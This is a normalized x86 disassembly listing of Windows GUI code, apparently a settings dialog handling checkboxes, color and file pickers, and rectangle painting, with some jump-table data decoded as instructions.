sub esp 0x280
push ebx
push ebp
add eax 0xffffffd5
cmp eax 0xe9
push esi
push edi
ja r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x280
retn 0x10
movzx eax [ eax + lookup_table_45cad0 ]
jmp [ eax * 4 + jump_table_45cab8 ]
test [ rw-data ] 0x1
mov ebp [ esp + 0x294 ]
mov esi [ CheckDlgButton@IAT ]
je r-xdata
mov ebx [ esp + 0x2a0 ]
push 0x0
push 0x0
push 0x400
push ebx
call [ SendMessageA@IAT ]
mov edi eax
test edi edi
jl r-xdata
mov esi [ esp + 0x2a0 ]
mov ecx [ esi + 0x14 ]
push 0xffffffeb
push ecx
call [ GetWindowLongA@IAT ]
push eax
call [ CreateSolidBrush@IAT ]
mov edi eax
mov eax [ esi + 0x18 ]
push edi
lea edx [ esi + 0x1c ]
push edx
push eax
call [ FillRect@IAT ]
push edi
call [ DeleteObject@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x280
retn 0x10
mov eax [ esp + 0x29c ]
movzx ecx ax
add ecx 0xfffff7ea
cmp ecx 0x44
ja r-xdata
mov ecx [ esp + 0x2a0 ]
mov eax [ ecx + 0x8 ]
cmp eax 0xffffff37
jne r-xdata
test [ rw-data ] 0x2
push 0x1
je r-xdata
push 0x1
push 0x83a
push ebp
call esi
mov esi [ esp + 0x294 ]
push 0x837
push esi
call [ GetDlgItem@IAT ]
cmp ebx eax
mov ebp [ SetDlgItemInt@IAT ]
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x280
retn 0x10
movzx ecx [ ecx + lookup_table_45cbdc ]
jmp [ ecx * 4 + jump_table_45cbbc ]
cmp eax 0xffffff36
jne r-xdata
mov [ rw-data ] 0x2
push 0x834
push 0x835
jmp r-xdata
push 0x839
push esi
call [ GetDlgItem@IAT ]
cmp ebx eax
jne r-xdata
mov eax [ edi * 4 + rw-data ]
push 0x0
push eax
push 0x836
push esi
call ebp
cmp ax 0x846
mov esi [ esp + 0x294 ]
jne r-xdata
push 0x104
lea ecx [ esp + 0x190 ]
xor ebx ebx
push ecx
push ebx
mov [ esp + 0x94 ] bl
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x18c ]
push edx
call sub_457f40
mov esi [ esp + 0x298 ]
push r--data
mov [ esp + eax + 0x193 ] bl
push 0x104
lea eax [ esp + 0x94 ]
push eax
lea ecx [ esp + 0x19c ]
push ecx
push esi
call sub_45be60
mov al [ esp + 0xa0 ]
add esp 0x18
cmp al bl
je r-xdata
xor ecx ecx
xor ebx ebx
cmp ax 0x849
setne cl
mov [ esp + 0x18c ] bl
mov ebp ecx
mov edx ebp
imul edx edx 0x104
lea esi [ edx + rw-data ]
push esi
call [ lstrlenA@IAT ]
test eax eax
jle r-xdata
mov esi [ esp + 0x294 ]
push 0x0
push esi
push 0x468
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
push 0x842
push esi
call [ IsDlgButtonChecked@IAT ]
mov edi eax
dec edi
neg edi
sbb edi edi
inc edi
mov edx edi
mov eax 0x844
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x845
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x846
mov ecx esi
call sub_457d70
xor edx edx
test edi edi
sete dl
mov eax 0x847
mov ecx esi
mov edi edx
call sub_457d70
mov edx edi
mov eax 0x848
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x849
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x84a
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x84b
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x84c
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x84d
mov ecx esi
call sub_457d70
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x280
retn 0x10
mov esi [ esp + 0x294 ]
push 0x0
push esi
push 0x468
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
push 0x84e
push esi
call [ IsDlgButtonChecked@IAT ]
mov edi eax
dec edi
neg edi
sbb edi edi
inc edi
mov edx edi
mov eax 0x850
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x851
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x852
mov ecx esi
call sub_457d70
xor eax eax
test edi edi
sete al
mov ecx esi
mov edi eax
mov edx eax
mov eax 0x853
call sub_457d70
mov edx edi
mov eax 0x854
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x855
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x856
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x857
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x858
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x859
mov ecx esi
call sub_457d70
mov edx edi
mov eax 0x85a
mov ecx esi
call sub_457d70
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x280
retn 0x10
shr eax 0x10
cmp eax 0x300
jne r-xdata
mov eax [ esp + 0x294 ]
push 0x0
push eax
push 0x468
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x280
retn 0x10
mov esi [ esp + 0x294 ]
mov edi [ IsDlgButtonChecked@IAT ]
push 0x835
push esi
call edi
dec eax
neg eax
sbb eax eax
and eax 0xfffffffe
push 0x83a
add eax 0x2
push esi
mov [ rw-data ] eax
call edi
cmp eax 0x1
jne r-xdata
push ebp
call esi
mov ecx [ rw-data ]
push ecx
push 0xd
push 0x0
mov esi 0x837
mov edi ebp
call sub_457c30
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
mov ebx [ SetDlgItemInt@IAT ]
add esp 0xc
push 0x0
push eax
push 0x836
push ebp
call ebx
mov ecx [ rw-data ]
push ecx
push 0x6
push 0x0
mov esi 0x839
call sub_457c30
mov edx [ rw-data ]
fld [ edx * 4 + rw-data ]
add esp 0xc
fmul [ r--data ]
push 0x0
push ecx
fstp [ esp ]
call sub_452500
add esp 0x4
push eax
push 0x838
push ebp
call ebx
mov eax [ rw-data ]
mov ecx 0x83b
mov edx ebp
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x83c
mov edx ebp
call sub_457bf0
mov ecx [ rw-data ]
push 0x83e
push ebp
mov eax 0x83d
call sub_457c00
mov eax [ rw-data ]
mov ecx 0x841
mov edx ebp
call sub_457bf0
mov eax [ rw-data ]
push eax
push 0x20
push 0x0
mov edi 0x83f
mov ebx 0x840
mov esi ebp
call sub_457b80
add esp 0x14
mov eax rw-data
mov ecx 0x816
mov edx ebp
call sub_457c20
mov ecx [ rw-data ]
mov esi [ GetDlgItem@IAT ]
push ecx
push 0xffffffeb
push 0x845
push ebp
call esi
mov edi [ SetWindowLongA@IAT ]
push eax
call edi
mov edx [ rw-data ]
push edx
push 0xffffffeb
push 0x851
push ebp
call esi
push eax
call edi
mov ecx [ rw-data ]
push 0x843
push ebp
mov eax 0x842
call sub_457c00
mov ecx [ rw-data ]
push 0x84f
push ebp
mov eax 0x84e
call sub_457c00
mov eax rw-data
mov ecx 0x848
mov edx ebp
call sub_457c20
mov eax rw-data
mov ecx 0x854
mov edx ebp
call sub_457c20
mov ecx [ rw-data ]
push 0x84d
push ebp
mov eax 0x84b
call sub_457c00
mov ecx [ rw-data ]
push 0x85a
push ebp
mov eax 0x857
call sub_457c00
mov esi [ SendMessageA@IAT ]
add esp 0x20
push 0x0
push 0x842
push 0x111
push ebp
call esi
push 0x0
push 0x84e
push 0x111
push ebp
call esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x280
retn 0x10
fld [ edi * 4 + rw-data ]
push 0x0
fmul [ r--data ]
push ecx
fstp [ esp ]
call sub_452500
add esp 0x4
push eax
push 0x838
push esi
call ebp
push 0x851
push 0x845
jmp r-xdata
push ebx
push esi
push 0x468
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
lea edx [ esp + 0x88 ]
push edx
push 0x816
push esi
call [ SetDlgItemTextA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x280
retn 0x10
push 0x104
lea ecx [ esp + 0x8c ]
push ecx
push ebx
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x88 ]
push edx
call sub_457f40
add esp 0x4
mov [ esp + eax + 0x87 ] bl
push esi
lea eax [ esp + 0x8c ]
push eax
call [ lstrcpyA@IAT ]
jmp r-xdata
push rw-data
push 0xd
push 0x0
mov eax 0x837
mov ecx esi
call sub_457d50
push rw-data
push 0x6
push 0x0
mov eax 0x839
mov ecx esi
call sub_457d50
push rw-data
mov eax 0x83b
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x83c
mov ecx esi
call sub_457ce0
push rw-data
push 0x83e
push esi
mov ebx 0x83d
call sub_457d00
push rw-data
mov eax 0x841
mov ecx esi
call sub_457ce0
push rw-data
push 0x20
push 0x0
push 0x840
mov ecx 0x83f
mov edx esi
call sub_457ca0
add esp 0x40
push esi
mov eax 0x104
mov ecx rw-data
mov edx 0x816
call sub_457d40
mov edi [ GetDlgItem@IAT ]
add esp 0x4
push 0xffffffeb
push 0x845
push esi
mov [ esp + 0x1f ] 0x0
call edi
mov ebx [ GetWindowLongA@IAT ]
push eax
call ebx
cmp [ rw-data ] eax
mov ebp [ CreateSolidBrush@IAT ]
je r-xdata
or [ rw-data ] 0x1
push ebx
push esi
push 0x468
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
mov eax [ esp + 0x24 ]
push eax
push 0xffffffeb
push edi
call [ SetWindowLongA@IAT ]
push 0x1
push ebx
push edi
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x280
retn 0x10
push esi
call [ GetDlgItem@IAT ]
mov edi eax
push 0xffffffeb
xor ebx ebx
push edi
mov [ esp + 0x20 ] 0x24
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] ebx
call [ GetWindowLongA@IAT ]
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] rw-data
mov [ esp + 0x30 ] 0x3
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
call [ ChooseColorA@IAT ]
test eax eax
je r-xdata
push ebx
push esi
push 0x468
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
cmp [ esp + 0x18c ] bl
je r-xdata
mov esi [ esp + 0x294 ]
xor eax eax
push 0xfffffffa
mov ecx 0x13
lea edi [ esp + 0x40 ]
[ edi ]
push esi
mov [ esp + 0x44 ] 0x4c
mov [ esp + 0x48 ] esi
call [ GetWindowLongA@IAT ]
mov [ esp + 0x44 ] eax
lea eax [ esp + 0x18c ]
mov [ esp + 0x58 ] eax
mov eax 0x103
lea edx [ esp + 0x3c ]
lea ecx [ esp + 0x88 ]
push edx
mov [ esp + 0x4c ] r--data
mov [ esp + 0x58 ] 0x1
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] ebx
mov [ esp + 0x68 ] eax
mov [ esp + 0x6c ] ecx
mov [ esp + 0x70 ] r--data
mov [ esp + 0x74 ] 0x1000
call [ GetOpenFileNameA@IAT ]
test eax eax
je r-xdata
push 0xffffffeb
push 0x851
push esi
call edi
push eax
call ebx
cmp [ rw-data ] eax
mov [ esp + 0x14 ] eax
je r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp ebp ebx
jne r-xdata
lea ecx [ esp + 0x14 ]
push ecx
push 0x843
push esi
mov ebx 0x842
call sub_457d00
mov eax [ esp + 0x20 ]
mov ecx [ rw-data ]
add esp 0xc
cmp ecx eax
je r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ rw-data ]
push edx
call ebp
mov [ rw-data ] eax
mov [ esp + 0x13 ] 0x1
push eax
call [ DeleteObject@IAT ]
lea ecx [ esp + 0x18c ]
push ecx
push 0x854
push esi
call [ SetDlgItemTextA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x280
retn 0x10
lea eax [ esp + 0x18c ]
push eax
push 0x848
push esi
call [ SetDlgItemTextA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x280
retn 0x10
lea edx [ esp + 0x14 ]
push edx
push 0x84f
push esi
mov ebx 0x84e
call sub_457d00
mov eax [ esp + 0x20 ]
mov ecx [ rw-data ]
add esp 0xc
cmp ecx eax
mov ebx 0x1
je r-xdata
mov [ rw-data ] eax
mov [ esp + 0x13 ] 0x1
mov eax [ rw-data ]
push eax
call ebp
mov [ rw-data ] eax
mov [ esp + 0x13 ] 0x1
push eax
call [ DeleteObject@IAT ]
push esi
mov eax 0x104
lea ecx [ esp + 0x8c ]
mov edx 0x848
call sub_457d40
mov eax [ rw-data ]
mov edi [ lstrcpyA@IAT ]
mov ebp [ lstrcmpA@IAT ]
add esp 0x4
cmp eax ebx
jne r-xdata
mov [ rw-data ] eax
mov [ esp + 0x13 ] bl
push esi
mov eax 0x104
lea ecx [ esp + 0x8c ]
mov edx 0x854
call sub_457d40
mov eax [ rw-data ]
add esp 0x4
cmp eax ebx
jne r-xdata
mov ecx rw-data
call sub_41eb60
test al al
je r-xdata
lea ecx [ esp + 0x14 ]
push ecx
push 0x84d
push esi
mov ebx 0x84b
call sub_457d00
mov eax [ esp + 0x20 ]
mov ecx [ rw-data ]
add esp 0xc
cmp ecx eax
je r-xdata
mov ecx rw-data
call sub_41eb60
test al al
je r-xdata
lea ecx [ esp + 0x88 ]
push ecx
push rw-data
call edi
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
call sub_439280
add esp 0x4
push eax
push rw-data
push 0x0
mov ecx rw-data
call sub_4411b0
mov [ esp + 0x13 ] bl
lea eax [ esp + 0x88 ]
push eax
push rw-data
call ebp
test eax eax
je r-xdata
lea edx [ esp + 0x14 ]
push edx
push 0x85a
push esi
mov ebx 0x857
call sub_457d00
mov eax [ esp + 0x20 ]
mov ecx [ rw-data ]
add esp 0xc
cmp ecx eax
je r-xdata
mov [ rw-data ] eax
mov [ esp + 0x13 ] 0x1
lea eax [ esp + 0x88 ]
push eax
push rw-data
call edi
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
call sub_439280
add esp 0x4
push eax
push rw-data
push 0x0
mov ecx rw-data
call sub_4411b0
mov [ esp + 0x13 ] bl
lea edx [ esp + 0x88 ]
push edx
push rw-data
call ebp
test eax eax
je r-xdata
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov [ rw-data ] eax
jmp r-xdata
mov eax [ rw-data ]
mov esi [ InvalidateRect@IAT ]
push 0x1
push 0x0
push eax
call esi
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
push eax
call esi
sub_45cad6
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x1050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x3020505
add eax 0xff8b0405
salc
mov [ ebp ] 0x13
retn
sub_45cbe4
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add al [ edx ]
add [ edi ] al
add [ edi ] al
add al [ edx ]
add al [ edx ]
add al [ eax ]
pop es
add al [ ebx ]
add eax [ edi ]
pop es
add al 0x7
add [ 0x2020207 ] al
push es
push es
pop es
pop es
add al 0x7
add [ 0x2020207 ] al
add dl [ eax - 0x6f6f6f70 ]
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov cl [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
mov al [ esi + 0x17 ]
cmp al cl
push edi
jne r-xdata
pop edi
mov eax 0x1
pop esi
retn 0x10
mov cl [ esi + 0x1b ]
xor cl [ rw-data ]
test cl 0x3
jne r-xdata
mov edi [ esp + 0x18 ]
push 0xdda
push edi
call [ IsDlgButtonChecked@IAT ]
mov cl [ esi + 0x1c ]
cmp eax 0x1
lea eax [ esi + 0x1c ]
jne r-xdata
cmp cl 0x40
jne r-xdata
cmp cl 0x40
jne r-xdata
push eax
push 0x0
push 0x143
push 0xde6
push edi
call [ SendDlgItemMessageA@IAT ]
pop edi
mov eax 0x1
pop esi
retn 0x10
sub_45cca0
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor edx edx
mov dl [ rw-data ]
mov ecx rw-data
push edx
call sub_43e1d0
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
retn
push eax
mov eax [ esp + 0x8 ]
push r--data
push r--data
push eax
call [ MessageBoxA@IAT ]
xor eax eax
mov al [ rw-data ]
push eax
call sub_43e1d0
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
push eax
push r--data
push r--data
push ecx
call [ MessageBoxA@IAT ]
retn
sub_45cd20
mov ecx [ esp + 0x8 ]
mov eax ecx
sub eax 0x100
push esi
mov esi [ esp + 0x10 ]
je r-xdata
cmp esi 0x25
jb r-xdata
sub eax 0x4
jne r-xdata
mov edx [ rw-data ]
push edx
call [ SetFocus@IAT ]
mov eax [ esp + 0x14 ]
mov ecx [ rw-data ]
push eax
push esi
push 0x100
push ecx
call [ SendMessageA@IAT ]
xor eax eax
pop esi
retn 0x10
cmp esi 0x28
ja r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x8 ]
push edx
push esi
push ecx
mov ecx [ rw-data ]
push eax
push ecx
call [ CallWindowProcA@IAT ]
pop esi
retn 0x10
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
mov ecx [ esp + 0x14 ]
mov eax [ rw-data ]
push ecx
mov edx esi
push edx
push 0x100
push eax
call [ SendMessageA@IAT ]
xor eax eax
pop esi
retn 0x10
sub_45cdc0
mov al [ rw-data ]
sub esp 0x18
test al al
je r-xdata
add esp 0x18
retn 0x10
cmp [ rw-data ] 0x5
jle r-xdata
inc [ rw-data ]
lea eax [ esp ]
push eax
call [ GetCursorPos@IAT ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
push ecx
push edx
call [ WindowFromPoint@IAT ]
cmp [ rw-data ] eax
jne r-xdata
mov [ rw-data ] 0x0
add esp 0x18
retn 0x10
push esi
mov esi [ GetAsyncKeyState@IAT ]
push edi
push 0x2
call esi
xor edi edi
push 0x1
mov di ax
call esi
or edi eax
test edi 0x8000
pop edi
pop esi
jne r-xdata
push 0x0
call [ ShowCursor@IAT ]
mov eax [ rw-data ]
lea ecx [ esp + 0x8 ]
push ecx
mov [ rw-data ] 0x0
mov [ esp + 0xc ] 0x10
mov [ esp + 0x10 ] 0x2
mov [ esp + 0x14 ] eax
call [ _TrackMouseEvent@IAT ]
sub_45ce70
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x8 ]
push ebx
mov ebx [ eax ]
cmp ebx edx
jl r-xdata
mov edx [ ecx ]
push ebp
push esi
push edi
mov edi [ eax + 0x8 ]
cmp edi edx
jg r-xdata
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0xc ]
jl r-xdata
mov [ eax ] edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebp [ eax + 0xc ]
cmp ebp [ ecx + 0x4 ]
jg r-xdata
pop edi
mov [ eax + 0xc ] esi
pop esi
pop ebp
pop ebx
retn
cmp ebx edx
jge r-xdata
pop edi
pop esi
mov [ eax + 0x4 ] ebp
pop ebp
pop ebx
retn
mov edx [ ecx + 0x4 ]
cmp esi edx
jge r-xdata
mov [ eax ] edx
mov edx [ ecx + 0x8 ]
cmp edi edx
jle r-xdata
mov [ eax + 0x4 ] edx
mov ecx [ ecx + 0xc ]
cmp ebp ecx
jle r-xdata
mov [ eax + 0x8 ] edx
pop edi
pop esi
pop ebp
pop ebx
retn
mov [ eax + 0xc ] ecx
sub_45cef0
sub esp 0x50
push ebx
push ebp
push esi
mov esi [ esp + 0x6c ]
mov eax [ esi * 4 + rw-data ]
test eax eax
push edi
je r-xdata
mov ecx [ esp + 0x7c ]
mov edx [ esp + 0x78 ]
mov edi [ esp + 0x68 ]
neg ecx
push ecx
neg edx
push edx
push edi
call [ OffsetRect@IAT ]
mov eax [ esi * 4 + rw-data ]
mov ecx [ esp + 0x64 ]
push eax
push edi
push ecx
call [ FillRect@IAT ]
mov al [ esp + 0x6c ]
test al al
jne r-xdata
mov eax esi
imul eax eax 0xd50
lea edi [ eax + rw-data ]
mov eax [ edi + 0x18 ]
test eax eax
mov [ esp + 0x24 ] edi
jne r-xdata
mov eax [ esp + 0x74 ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebp [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ esp + 0x50 ] ecx
mov [ esp + 0x54 ] edx
mov [ esp + 0x58 ] ebp
mov [ esp + 0x5c ] eax
mov edx [ rw-data ]
lea ecx [ esp + 0x50 ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov eax [ esp + 0x5c ]
mov ebp [ esp + 0x58 ]
jmp r-xdata
cmp eax 0x1
jne r-xdata
mov edi [ esp + 0x50 ]
mov eax esi
sub eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ esp + 0x1c ]
sub eax ecx
cdq
sub eax edx
mov edx [ esp + 0x1c ]
sar esi 0x1
sub esi edi
mov edi eax
mov eax [ esp + 0x54 ]
sar edi 0x1
sub edi eax
mov eax ebp
sub eax esi
sub edx edi
sub eax ebx
sub edx ecx
test eax eax
mov [ esp + 0x28 ] edx
jle r-xdata
mov esi ebp
mov [ esp + 0x2c ] eax
mov [ esp + 0x20 ] esi
mov [ esp + 0x1c ] eax
call sub_40af00
push eax
push 0x0
mov ecx edi
call sub_4440b0
mov ebx eax
call sub_40af00
push eax
push 0x0
mov ecx edi
call sub_444100
mov ecx eax
mov eax [ esp + 0x70 ]
mov eax [ eax * 4 + rw-data ]
test eax eax
mov [ esp + 0x18 ] ecx
jne r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esp + 0x68 ]
mov ecx esi
mov edx [ ecx ]
mov eax [ ecx + 0x4 ]
mov [ esp + 0x30 ] edx
mov edx [ ecx + 0x8 ]
mov [ esp + 0x34 ] eax
mov eax [ ecx + 0xc ]
mov ecx [ esp + 0x7c ]
mov [ esp + 0x38 ] edx
mov edx [ esp + 0x78 ]
neg ecx
push ecx
neg edx
mov [ esp + 0x40 ] eax
push edx
lea eax [ esp + 0x38 ]
push eax
call [ OffsetRect@IAT ]
mov ecx [ esi ]
mov ebx [ esi + 0x4 ]
push 0x0
push 0x0
push 0x0
mov [ esp + 0x7c ] ecx
call sub_40af00
mov edx [ esp + 0x38 ]
push eax
mov eax [ esp + 0x64 ]
push 0x0
push 0x2
push edx
mov edx [ esp + 0x6c ]
push ebp
lea ecx [ ebx + eax ]
mov eax [ esp + 0x90 ]
push ecx
lea ecx [ eax + edx ]
mov edx [ esi + 0xc ]
push ecx
mov ecx [ esi + 0x8 ]
sub edx ebx
push edx
mov edx [ esp + 0x60 ]
sub ecx eax
mov eax [ esp + 0x5c ]
push ecx
mov ecx [ esp + 0x94 ]
push edx
push eax
push ecx
mov ecx edi
call sub_4421e0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn
test edx edx
jle r-xdata
mov edx [ esp + 0x68 ]
mov ecx [ esp + 0x1c ]
xor eax eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
push edx
lea eax [ esp + 0x44 ]
push eax
mov [ esp + 0x50 ] esi
mov [ esp + 0x54 ] ecx
call sub_45ce70
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x50 ]
mov edx [ esp + 0x4c ]
mov [ esp + 0x38 ] ecx
mov ecx [ esp + 0x54 ]
mov [ esp + 0x40 ] eax
mov eax [ esp + 0x84 ]
add esp 0x8
mov [ esp + 0x3c ] ecx
mov ecx [ esp + 0x78 ]
neg eax
neg ecx
push eax
mov [ esp + 0x38 ] edx
push ecx
lea edx [ esp + 0x38 ]
push edx
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
call [ OffsetRect@IAT ]
mov eax [ esp + 0x70 ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x64 ]
push ecx
lea edx [ esp + 0x34 ]
push edx
push eax
call [ FillRect@IAT ]
mov eax [ esp + 0x68 ]
mov edx [ esp + 0x20 ]
lea ecx [ esi + ebx ]
mov [ esp + 0x40 ] ecx
sub ebp esi
push eax
lea ecx [ esp + 0x44 ]
sub ebp ebx
push ecx
mov [ esp + 0x34 ] ebp
mov [ esp + 0x50 ] edx
call sub_45ce70
mov eax [ esp + 0x4c ]
mov edx [ esp + 0x48 ]
mov ecx [ esp + 0x50 ]
add esp 0x8
mov [ esp + 0x30 ] edx
mov edx [ esp + 0x4c ]
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x38 ] ecx
mov ecx [ esp + 0x14 ]
push eax
mov [ esp + 0x40 ] edx
push ecx
lea edx [ esp + 0x38 ]
push edx
call [ OffsetRect@IAT ]
mov eax [ esp + 0x70 ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x64 ]
push ecx
lea edx [ esp + 0x34 ]
push edx
push eax
call [ FillRect@IAT ]
mov edx [ esp + 0x28 ]
mov ecx [ esp + 0x18 ]
mov eax ebp
cmp eax 0x3
jne r-xdata
mov ebp [ esp + 0x68 ]
mov eax [ ebp ]
cdq
idiv ebx
mov esi eax
mov eax [ esp + 0x50 ]
imul esi ebx
cdq
idiv ebx
mov eax [ ebp + 0x4 ]
sub esi edx
cdq
idiv ecx
mov [ esp + 0x20 ] esi
mov edi eax
mov eax [ esp + 0x54 ]
imul edi ecx
cdq
idiv ecx
mov eax [ ebp + 0xc ]
sub edi edx
cmp edi eax
mov [ esp + 0x70 ] edi
jge r-xdata
mov edx [ esp + 0x68 ]
lea eax [ esi + ebx ]
mov [ esp + 0x48 ] eax
push edx
lea eax [ esp + 0x44 ]
add ecx edi
push eax
mov [ esp + 0x48 ] esi
mov [ esp + 0x4c ] edi
mov [ esp + 0x54 ] ecx
call sub_45ce70
mov eax [ esp + 0x54 ]
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x4c ]
mov ebp [ esp + 0x50 ]
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x84 ]
add esp 0x8
neg eax
push eax
mov eax [ esp + 0x7c ]
neg eax
mov [ esp + 0x34 ] ecx
push eax
lea ecx [ esp + 0x38 ]
push ecx
mov [ esp + 0x40 ] edx
mov [ esp + 0x44 ] ebp
call [ OffsetRect@IAT ]
push 0x0
push 0x0
push 0x0
call sub_40af00
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x4c ]
push eax
push 0x0
push 0x0
push edx
mov edx [ esp + 0x60 ]
push ebx
mov eax edx
sub eax edi
push eax
mov eax ecx
sub eax esi
push eax
mov eax [ esp + 0x74 ]
sub eax edx
mov edx [ esp + 0x58 ]
push eax
mov eax [ esp + 0x90 ]
sub ebp ecx
mov ecx [ esp + 0x60 ]
push ebp
push ecx
mov ecx [ esp + 0x58 ]
push edx
push eax
call sub_4421e0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn
mov ecx [ esp + 0x68 ]
mov ebp [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x44 ]
sub ebp eax
push edx
mov [ esp + 0x48 ] esi
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x50 ] ebp
mov [ esp + 0x54 ] edi
call sub_45ce70
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x50 ]
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x54 ]
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x84 ]
mov [ esp + 0x3c ] ecx
mov ecx [ esp + 0x80 ]
add esp 0x8
neg eax
neg ecx
push eax
push ecx
mov [ esp + 0x1c ] ecx
lea ecx [ esp + 0x38 ]
push ecx
mov [ esp + 0x44 ] edx
mov [ esp + 0x1c ] eax
call [ OffsetRect@IAT ]
mov eax [ esp + 0x70 ]
mov edx [ eax * 4 + rw-data ]
mov ecx [ esp + 0x64 ]
lea eax [ eax * 4 + rw-data ]
mov [ esp + 0x70 ] eax
push edx
lea eax [ esp + 0x34 ]
push eax
push ecx
call [ FillRect@IAT ]
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
lea eax [ edi + edx ]
mov edx [ esp + 0x68 ]
mov [ esp + 0x44 ] eax
push edx
lea eax [ esp + 0x44 ]
push eax
mov [ esp + 0x48 ] esi
mov [ esp + 0x50 ] ebp
mov [ esp + 0x54 ] ecx
call sub_45ce70
